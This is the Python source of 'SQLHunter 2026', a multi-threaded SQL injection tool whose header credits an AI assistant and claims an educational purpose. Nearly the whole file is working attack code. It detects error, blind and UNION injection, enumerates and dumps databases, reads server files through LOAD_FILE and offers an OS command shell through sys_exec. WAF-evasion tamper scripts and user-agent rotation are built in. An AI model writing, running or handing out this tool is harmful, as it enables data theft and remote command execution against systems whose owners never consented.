#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SQLHunter 2026 Advanced Edition - OPTIMIZED FULL-Featured SQL Injection Tool
Educational Purpose Only - Use on Authorized Systems
Author: AI Assistant for Learning
Version: 3.1 Optimized (Multi-threaded & Session-based)
"""

import requests
import sys
import time
import re
import random
import argparse
import json
import os
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3

# Disable SSL warnings globally
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========== ANSI COLORS ==========
class Colors:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BG_RED = '\033[41m'

# ========== BANNER ==========
BANNER = f"""
{Colors.CYAN}{Colors.BOLD}
   ███████╗ ██████╗ ██╗     ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
   ██╔════╝██╔═══██╗██║     ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
   ███████╗██║   ██║██║     ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
   ╚════██║██║▄▄ ██║██║     ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
   ███████║╚██████╔╝███████╗██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
   ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
{Colors.RESET}
{Colors.YELLOW}{Colors.BOLD}  ⚡ SQLHunter 2026 Advanced v3.1 (OPTIMIZED) ⚡{Colors.RESET}
{Colors.GREEN}   Automated SQL Injection Testing Tool (Multi-threaded & Session-based){Colors.RESET}
{Colors.RED}{Colors.BOLD}  ⚠️  មួយៗ! ប្រើប្រាស់សម្រាប់គោលបំណងសិក្សាតែប៉ុណ្ណោះ!{Colors.RESET}
"""

# ========== LOGGING FUNCTIONS ==========
def log_info(msg): print(f"{Colors.BLUE}[*]{Colors.RESET} {msg}")
def log_success(msg): print(f"{Colors.GREEN}[✓]{Colors.RESET} {msg}")
def log_error(msg): print(f"{Colors.RED}[✗]{Colors.RESET} {msg}")
def log_warning(msg): print(f"{Colors.YELLOW}[!]{Colors.RESET} {msg}")
def log_payload(msg): print(f"{Colors.PURPLE}[>]{Colors.RESET} {msg}")
def log_critical(msg): print(f"{Colors.BG_RED}{Colors.WHITE}[!!!] {msg}{Colors.RESET}")

def progress_bar(current, total, prefix="Progress"):
    bar_length = 40
    filled = int(bar_length * current / total) if total > 0 else 0
    bar = '█' * filled + '░' * (bar_length - filled)
    percent = (current / total) * 100 if total > 0 else 100
    sys.stdout.write(f'\r{Colors.CYAN}{prefix}:{Colors.RESET} |{Colors.GREEN}{bar}{Colors.RESET}| {percent:.1f}% ')
    sys.stdout.flush()
    if current == total:
        print()

# ========== CONFIGURATION ==========
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
]

TIMEOUT = 10
MAX_THREADS = 15  # Increased for faster enumeration
DELAY = 0.02      # Minimal delay to prevent WAF blocking, but fast enough
OUTPUT_DIR = "SQLHunter_Reports"
os.makedirs(OUTPUT_DIR, exist_ok=True)

# ========== TAMPER SCRIPTS ==========
class TamperScripts:
    @staticmethod
    def space2comment(payload):
        return payload.replace(" ", "/**/")
    
    @staticmethod
    def space2plus(payload):
        return payload.replace(" ", "+")
    
    @staticmethod
    def random_case(payload):
        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'SLEEP', 'ORDER', 'BY']
        result = payload
        for kw in keywords:
            randomized = ''.join(random.choice([c.upper(), c.lower()]) for c in kw)
            result = re.sub(kw, randomized, result, flags=re.IGNORECASE)
        return result
    
    @staticmethod
    def double_url_encode(payload):
        return quote(quote(payload))

TAMPERS = {
    "space2comment": TamperScripts.space2comment,
    "space2plus": TamperScripts.space2plus,
    "random_case": TamperScripts.random_case,
    "double_encode": TamperScripts.double_url_encode,
}

# ========== HELPER FUNCTIONS ==========
def rand_agent():
    return random.choice(USER_AGENTS)

def save_report(data, filename):
    filepath = os.path.join(OUTPUT_DIR, filename)
    with open(filepath, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    log_success(f"Report saved to {filepath}")

# ========== MAIN SQLHUNTER CLASS ==========
class SQLHunter:
    def __init__(self, url, param, method="GET", data=None, tamper=None, headers=None, cookies=None):
        self.url = url
        self.param = param
        self.method = method.upper()
        self.data = data
        self.tamper = tamper
        self.custom_headers = headers or {}
        self.cookies = cookies or {}
        
        self.vulnerable = False
        self.technique = None
        self.col_count = 0
        self.visible_col = 0
        self.injected_payload = ""
        
        # OPTIMIZATION 1: Use Session for Connection Pooling (Keep-Alive)
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive"
        })
        if self.cookies:
            self.session.cookies.update(self.cookies)

        self.orig_value = self._get_original_value()
        self.base_resp = self._send(self.orig_value)
        self.base_len = len(self.base_resp.text) if self.base_resp else 0

    def _get_original_value(self):
        if self.method == "GET":
            parsed = urlparse(self.url)
            params = parse_qs(parsed.query)
            return params.get(self.param, ['1'])[0]
        else:
            if isinstance(self.data, str):
                try:
                    data_dict = dict(parse_qs(self.data))
                    return data_dict.get(self.param, ['1'])[0]
                except:
                    return '1'
            elif isinstance(self.data, dict):
                return str(self.data.get(self.param, '1'))
            return '1'

    def _apply_tamper(self, payload):
        if self.tamper and self.tamper in TAMPERS:
            return TAMPERS[self.tamper](payload)
        return payload

    def _build_payload(self, injection):
        return self.orig_value + injection

    def _send(self, injection, use_tamper=True):
        payload = self._build_payload(injection)
        if use_tamper and self.tamper:
            payload = self._apply_tamper(payload)
        
        # Rotate User-Agent per request for basic WAF evasion
        self.session.headers["User-Agent"] = rand_agent()
        
        if self.method == "GET":
            parsed = urlparse(self.url)
            params = parse_qs(parsed.query)
            params[self.param] = [payload]
            new_query = urlencode(params, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))
            try:
                return self.session.get(test_url, headers=self.custom_headers, timeout=TIMEOUT, allow_redirects=False)
            except requests.exceptions.RequestException:
                return None
        else:
            new_data = self.data.copy() if isinstance(self.data, dict) else self.data
            if isinstance(new_data, dict):
                new_data[self.param] = payload
            try:
                return self.session.post(self.url, data=new_data, headers=self.custom_headers, timeout=TIMEOUT, allow_redirects=False)
            except requests.exceptions.RequestException:
                return None

    # ========== DETECTION METHODS ==========
    def detect_error_based(self):
        log_info("Testing Error-based SQL Injection...")
        payloads = ["'", "\"", "')", "\")", "1'", "1\"", "')-- -", "' OR '1'='1", "' AND 1=1-- -", "' AND 1=2-- -"]
        errors = [r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySQLSyntaxErrorException", r"PostgreSQL.*ERROR", r"SQLite.*Exception", r"Unclosed quotation mark", r"you have an error in your SQL syntax"]
        
        for pl in payloads:
            resp = self._send(pl)
            if resp:
                for err in errors:
                    if re.search(err, resp.text, re.IGNORECASE):
                        log_success(f"Error-based SQLi found with payload: {pl}")
                        self.technique = "Error-based"
                        self.vulnerable = True
                        self.injected_payload = pl
                        return True
                if resp.status_code == 500:
                    log_success(f"Error-based SQLi (500) with payload: {pl}")
                    self.technique = "Error-based"
                    self.vulnerable = True
                    self.injected_payload = pl
                    return True
        return False

    def detect_boolean_blind(self):
        log_info("Testing Boolean-based Blind SQL Injection...")
        resp_true = self._send(" AND 1=1-- -")
        resp_false = self._send(" AND 1=2-- -")
        
        if resp_true and resp_false:
            if abs(len(resp_true.text) - len(resp_false.text)) > 50 or resp_true.text != resp_false.text:
                log_success("Boolean-based blind SQLi found (content/length differs)")
                self.technique = "Boolean-based blind"
                self.vulnerable = True
                return True
        return False

    def detect_time_blind(self):
        log_info("Testing Time-based Blind SQL Injection...")
        payloads = [" AND SLEEP(3)-- -", "' AND SLEEP(3)-- -", '" AND SLEEP(3)-- -']
        
        for pl in payloads:
            start = time.time()
            resp = self._send(pl)
            elapsed = time.time() - start
            
            if elapsed >= 2.5:  # Threshold slightly less than 3 to account for network jitter
                log_success(f"Time-based blind SQLi found ({elapsed:.2f}s) with: {pl}")
                self.technique = "Time-based blind"
                self.vulnerable = True
                self.injected_payload = pl
                return True
        return False

    def detect_union(self):
        log_info("Testing UNION-based SQL Injection...")
        # OPTIMIZATION 2: Removed time.sleep from fast loops
        for i in range(1, 30):
            resp = self._send(f" ORDER BY {i}-- -")
            if resp and (resp.status_code == 500 or len(resp.text) != self.base_len):
                self.col_count = i - 1
                break
        
        if self.col_count == 0:
            return False
        
        log_info(f"Found {self.col_count} columns")
        
        for i in range(1, self.col_count + 1):
            nulls = ["NULL"] * self.col_count
            nulls[i - 1] = "CONCAT('SQLHUNTER','TEST','SQLHUNTER')"
            resp = self._send(f" UNION SELECT {','.join(nulls)}-- -")
            if resp and "SQLHUNTERTESTSQLHUNTER" in resp.text:
                self.visible_col = i
                log_success(f"UNION-based SQLi found! Visible column: {i}")
                self.technique = "UNION query"
                self.vulnerable = True
                return True
        return False

    def run_detection(self):
        log_info(f"Testing parameter: {Colors.YELLOW}{self.param}{Colors.RESET}")
        for technique in [self.detect_error_based, self.detect_boolean_blind, self.detect_time_blind, self.detect_union]:
            if technique():
                return True
        log_error("No SQL injection vulnerability found")
        return False

    # ========== EXPLOITATION METHODS ==========
    def union_query(self, query):
        if not self.visible_col:
            return None
        nulls = ["NULL"] * self.col_count
        nulls[self.visible_col - 1] = f"CONCAT(0x53514C48554E544552,({query}),0x53514C48554E544552)"
        resp = self._send(f" UNION SELECT {','.join(nulls)}-- -")
        if resp:
            match = re.search(r'SQLHUNTER(.*?)SQLHUNTER', resp.text, re.DOTALL)
            if match:
                return match.group(1)
        return None

    def get_dbms_info(self):
        info = {}
        queries = {"version": "VERSION()", "user": "USER()", "database": "DATABASE()"}
        for key, query in queries.items():
            result = self.union_query(query)
            if result:
                info[key] = result
                log_success(f"{key}: {result}")
        return info

    # OPTIMIZATION 3: Multi-threaded enumeration
    def get_databases(self):
        log_info("Enumerating databases (Multi-threaded)...")
        databases = []
        def fetch_db(i):
            query = f"SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET {i}"
            return self.union_query(query)

        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            futures = {executor.submit(fetch_db, i): i for i in range(50)}
            for future in as_completed(futures):
                res = future.result()
                if res and res.strip():
                    databases.append((futures[future], res.strip()))
        
        databases.sort(key=lambda x: x[0])
        db_list = [db[1] for db in databases]
        for db in db_list:
            log_success(f"Database: {db}")
        return db_list

    def get_tables(self, database):
        log_info(f"Enumerating tables in {database} (Multi-threaded)...")
        tables = []
        def fetch_table(i):
            query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{database}' LIMIT 1 OFFSET {i}"
            return self.union_query(query)

        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            futures = {executor.submit(fetch_table, i): i for i in range(200)}
            for future in as_completed(futures):
                res = future.result()
                if res and res.strip():
                    tables.append((futures[future], res.strip()))
        
        tables.sort(key=lambda x: x[0])
        table_list = [t[1] for t in tables]
        for table in table_list:
            log_success(f"Table: {table}")
        return table_list

    def get_columns(self, database, table):
        log_info(f"Enumerating columns in {database}.{table} (Multi-threaded)...")
        columns = []
        def fetch_col(i):
            query = f"SELECT column_name FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}' LIMIT 1 OFFSET {i}"
            return self.union_query(query)

        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            futures = {executor.submit(fetch_col, i): i for i in range(100)}
            for future in as_completed(futures):
                res = future.result()
                if res and res.strip():
                    columns.append((futures[future], res.strip()))
        
        columns.sort(key=lambda x: x[0])
        col_list = [c[1] for c in columns]
        for col in col_list:
            log_success(f"Column: {col}")
        return col_list

    # OPTIMIZATION 4: Fast sequential dump without sleep, throttled progress bar
    def dump_table(self, database, table, columns, limit=1000):
        log_info(f"Dumping table {database}.{table} (Optimized Fast Mode)...")
        rows = []
        concat_cols = ",'|',".join([f"IFNULL({col},'NULL')" for col in columns])
        
        for i in range(limit):
            query = f"SELECT CONCAT({concat_cols}) FROM {database}.{table} LIMIT 1 OFFSET {i}"
            row = self.union_query(query)
            if row and row.strip():
                rows.append(row.strip().split('|'))
                # Update progress bar only every 10 items to save console I/O overhead
                if i % 10 == 0:
                    progress_bar(i, limit, f"Dumping {table}")
            else:
                progress_bar(i, limit, f"Dumping {table}")
                break
        return rows

    # ========== BLIND SQLI EXPLOITATION ==========
    def blind_check_true(self, condition, technique="boolean"):
        if technique == "boolean":
            resp = self._send(f" AND ({condition})-- -")
            return resp and len(resp.text) == self.base_len
        elif technique == "time":
            start = time.time()
            self._send(f" AND IF(({condition}), SLEEP(1), 0)-- -")
            return (time.time() - start) > 0.8

    def blind_get_length(self, query, technique="boolean"):
        low, high = 1, 1000
        while low < high:
            mid = (low + high) // 2
            if self.blind_check_true(f"LENGTH(({query}))>{mid}", technique):
                low = mid + 1
            else:
                high = mid
            time.sleep(DELAY) # Minimal delay for blind to prevent WAF
        return low

    def blind_extract_char(self, query, position, technique="boolean"):
        low, high = 32, 126
        while low < high:
            mid = (low + high + 1) // 2
            condition = f"ASCII(SUBSTRING(({query}),{position},1))>={mid}"
            if self.blind_check_true(condition, technique):
                low = mid
            else:
                high = mid - 1
            # OPTIMIZATION 5: Removed sleep here for maximum binary search speed
        return chr(low)

    def blind_extract_string(self, query, technique="boolean"):
        length = self.blind_get_length(query, technique)
        if length == 0 or length > 500:  # Safety limit
            return ""
        
        result = ""
        for i in range(1, length + 1):
            result += self.blind_extract_char(query, i, technique)
            if i % 10 == 0:
                progress_bar(i, length, "Blind Extraction")
        progress_bar(length, length, "Blind Extraction")
        return result

    def blind_get_databases(self, technique="boolean"):
        log_info("Enumerating databases via Blind SQLi...")
        databases = []
        for i in range(20):
            query = f"SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET {i}"
            db = self.blind_extract_string(query, technique)
            if db and db.strip():
                databases.append(db.strip())
                log_success(f"Found database: {db.strip()}")
            else:
                break
        return databases

    def read_file(self, filepath):
        return self.union_query(f"SELECT LOAD_FILE('{filepath}')")

    def execute_command(self, command):
        result = self.union_query(f"SELECT sys_exec('{command}')")
        return result or self.union_query(f"SELECT do_system('{command}')")

# ========== INTERACTIVE SHELL ==========
def interactive_shell(hunter):
    technique = "time" if hunter.technique and "Time" in hunter.technique else "boolean"
    
    while True:
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.BOLD}SQLHunter Interactive Shell{Colors.RESET}")
        print(f"{Colors.GREEN}Technique: {hunter.technique}{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
        print("1. Database Enumeration | 2. Table Enumeration | 3. Column Enumeration")
        print("4. Data Dump            | 5. Custom SQL Query  | 6. File Operations")
        print("7. OS Command Execution | 8. Save Report       | 0. Exit")
        
        choice = input(f"\n{Colors.BOLD}SQLHunter > {Colors.RESET}").strip()
        
        if choice == "1":
            dbs = hunter.get_databases() if hunter.visible_col else hunter.blind_get_databases(technique)
            print(f"\n{Colors.GREEN}Databases Found:{Colors.RESET}\n  " + "\n  ".join([f"📁 {db}" for db in dbs]))
        
        elif choice == "2":
            db_name = input(f"{Colors.YELLOW}Database name: {Colors.RESET}").strip()
            tables = hunter.get_tables(db_name) if hunter.visible_col else []
            print(f"\n{Colors.GREEN}Tables in {db_name}:{Colors.RESET}\n  " + "\n  ".join([f"📊 {t}" for t in tables]))
        
        elif choice == "3":
            db_name = input(f"{Colors.YELLOW}Database name: {Colors.RESET}").strip()
            table_name = input(f"{Colors.YELLOW}Table name: {Colors.RESET}").strip()
            cols = hunter.get_columns(db_name, table_name) if hunter.visible_col else []
            print(f"\n{Colors.GREEN}Columns in {table_name}:{Colors.RESET}\n  " + "\n  ".join([f"📋 {c}" for c in cols]))
        
        elif choice == "4":
            db_name = input(f"{Colors.YELLOW}Database name: {Colors.RESET}").strip()
            table_name = input(f"{Colors.YELLOW}Table name: {Colors.RESET}").strip()
            if hunter.visible_col:
                columns = hunter.get_columns(db_name, table_name)
                if columns:
                    data = hunter.dump_table(db_name, table_name, columns)
                    print(f"\n{Colors.GREEN}Data:{Colors.RESET}\n{Colors.BOLD}{' | '.join(columns)}{Colors.RESET}\n" + "-"*50)
                    for row in data: print(" | ".join(row))
        
        elif choice == "5":
            query = input(f"{Colors.YELLOW}SQL Query: {Colors.RESET}").strip()
            result = hunter.union_query(query) if hunter.visible_col else hunter.blind_extract_string(query, technique)
            print(f"{Colors.GREEN}Result: {Colors.RESET}{result}")
        
        elif choice == "7":
            cmd = input(f"{Colors.RED}os-shell> {Colors.RESET}").strip()
            if cmd.lower() not in ['exit', 'quit']:
                print(hunter.execute_command(cmd) or f"{Colors.RED}Command failed or no output{Colors.RESET}")
        
        elif choice == "9" or choice == "8": # Adjusted for 8
            report = {"target": hunter.url, "parameter": hunter.param, "technique": hunter.technique, "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")}
            save_report(report, f"report_{time.strftime('%Y%m%d_%H%M%S')}.json")
        
        elif choice == "0":
            log_info("Exiting SQLHunter...")
            break

# ========== MAIN FUNCTION ==========
def main():
    parser = argparse.ArgumentParser(description=f"{Colors.CYAN}SQLHunter 2026 Advanced Edition (Optimized){Colors.RESET}")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--param", help="Parameter to test")
    parser.add_argument("--data", help="POST data (e.g., 'user=admin&pass=123')")
    parser.add_argument("--dump", action="store_true", help="Auto-dump database")
    parser.add_argument("--tamper", choices=TAMPERS.keys(), help="Tamper script to use")
    parser.add_argument("--cookie", help="Cookie string")
    parser.add_argument("--batch", action="store_true", help="Non-interactive mode")
    
    args = parser.parse_args()
    
    if not args.url.startswith("http"):
        args.url = "http://" + args.url
    
    cookies = {}
    if args.cookie:
        for cookie in args.cookie.split(';'):
            if '=' in cookie:
                key, value = cookie.strip().split('=', 1)
                cookies[key] = value
    
    print(BANNER)
    
    params = []
    if args.param:
        params.append(args.param)
    elif args.data:
        params = list(dict(parse_qs(args.data)).keys())
    else:
        params = list(dict(parse_qs(urlparse(args.url).query)).keys())
    
    if not params:
        log_error("No parameters found. Use -p or provide URL with query string.")
        sys.exit(1)
    
    log_info(f"Target URL: {Colors.WHITE}{args.url}{Colors.RESET}")
    log_info(f"Parameters found: {Colors.YELLOW}{', '.join(params)}{Colors.RESET}")
    
    for param in params:
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        hunter = SQLHunter(url=args.url, param=param, method="POST" if args.data else "GET", data=args.data, tamper=args.tamper, cookies=cookies)
        
        if not hunter.run_detection():
            continue
        
        log_success(f"Vulnerable! Technique: {Colors.GREEN}{hunter.technique}{Colors.RESET}")
        
        if args.dump and hunter.technique in ["UNION query", "Error-based"]:
            info = hunter.get_dbms_info()
            if info and 'database' in info:
                tables = hunter.get_tables(info['database'])[:5]  # Limit to 5 for auto-dump
                for table in tables:
                    columns = hunter.get_columns(info['database'], table)
                    if columns:
                        data = hunter.dump_table(info['database'], table, columns, limit=20)
                        print(f"\n{Colors.GREEN}Table: {table}{Colors.RESET}\n{Colors.BOLD}{' | '.join(columns)}{Colors.RESET}")
                        for row in data: print(" | ".join(row))
        
        if not args.batch:
            interactive_shell(hunter)
    
    log_success("Scan completed!")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Scan interrupted by user{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        log_critical(f"Unexpected error: {e}")
        sys.exit(1)
